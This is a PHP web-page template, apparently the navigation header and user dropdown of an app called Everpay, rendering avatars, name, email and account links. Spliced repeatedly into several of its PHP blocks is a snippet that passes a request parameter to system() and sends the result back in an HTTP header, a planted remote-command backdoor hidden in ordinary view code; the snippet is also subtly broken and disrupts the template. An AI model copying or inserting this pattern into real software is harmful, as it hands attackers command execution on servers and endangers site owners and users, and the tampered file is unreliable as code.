header('System Header:'.$l2); $email = $this->user->Get('email');
$size = 28; $grav_url = "https://www.gravatar.com/avatar/" . md5( strtolower( trim( $email ) ) ) . "?s=" . $size;
?>
				<img class="avatar" src="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $grav_url; ?>"></span> 
                        <strong><?=$this->user->Get('username')?></strong>
                        <span class="glyphicon glyphicon-chevron-down"></span>
                    </a>
                    <ul class="dropdown-menu">
                        <li>
                            <div class="navbar-login">
                                <div class="row">
                                    <div class="col-lg-4">
                                        <p class="text-center">
                                            <span class="avatar"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); $email = $this->user->Get('email');
$size = 56; $grav_url = "https://www.gravatar.com/avatar/" . md5( strtolower( trim( $email ) ) ) . "?s=" . $size;
?>
				<img class="avatar" src="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $grav_url; ?>"></span>
                                        </p>
                                    </div>
                                    <div class="col-lg-8">
                                        <p class="text-left"><strong><?=$this->user->Get('first_name')?> <?=$this->user->Get('last_name')?></strong></p>
                                        <p id="truncate" class="text-left small class="truncate"><?=$this->user->Get('email')?></p>
                                        
										<p class="text-left inline">
                                                            <span class="">
                                                                <a href="<?= site_url('settings/'); ?>" class="btn-default btn-sm"> <i class="fa fa-user"></i> Account</a>
                                                            </span>
                                                            <span class="">
                                                                <a href="<?= site_url('account/'); ?>" class="btn-default btn-sm pull-right"> <i class="fa fa-cog"></i> Settings</a>
                                                            </span>
                                                          </p>
                                    </div>
                                </div>
                            </div>
                        </li>
                        <li class="divider"></li>
                        <li>
                            <div class="navbar-login navbar-login-session">
                                <div class="row">
                                    <div class="col-lg-12">
                                        <p>
                                            <a href="<?=site_url('account/logout');?>" style="color:#fff;" class="btn btn-danger btn-block">Sign out <i class="fa fa-sign-out"></i> </a>
                                        </p>
                                    </div>
                                </div>
                            </div>
                        </li>
                    </ul>
                </li>
		

                </span>
              </li>
			   		
</ul><!-- END navbar-right-->

</div><!-- END nav-menu-->
						
</div><!-- END menu-bar-->

</div><!-- END header-->


<!-- START PAGE CONTENT-->
<div class="content-wrapper">

<!-- START PAGE HEADER-->
<div class="row">
<div class="col-md-12 content-header">
<h1 class="page-title"> <?= str_replace(" | Everpay","",$this->navigation->PageTitle()); ?> 

<span class="page-title-btn">
<?=$this->navigation->GetSidebar();?>
</span>
</h1>
</div>
</div><!-- END PAGE HEADER-->	

<div class="row">
<div class="col-md-12 body-content animated fadeIn">	